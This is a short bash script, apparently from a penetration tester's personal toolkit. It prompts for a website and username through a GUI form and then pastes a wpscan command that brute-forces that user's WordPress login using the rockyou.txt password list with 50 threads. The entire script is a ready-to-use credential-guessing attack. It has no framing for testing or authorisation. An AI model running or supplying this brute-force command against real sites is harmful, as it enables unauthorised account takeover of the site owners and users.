#!/bin/bash

: '
wpscan bruteforce user with password file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website" "Username"

WEBSITE=${form_data["Website"]}
USERNAME=${form_data["Username"]}

paste_command "wpscan --url ${WEBSITE} --usernames ${USERNAME} --passwords /usr/share/wordlist/rockyou.txt  -t 50"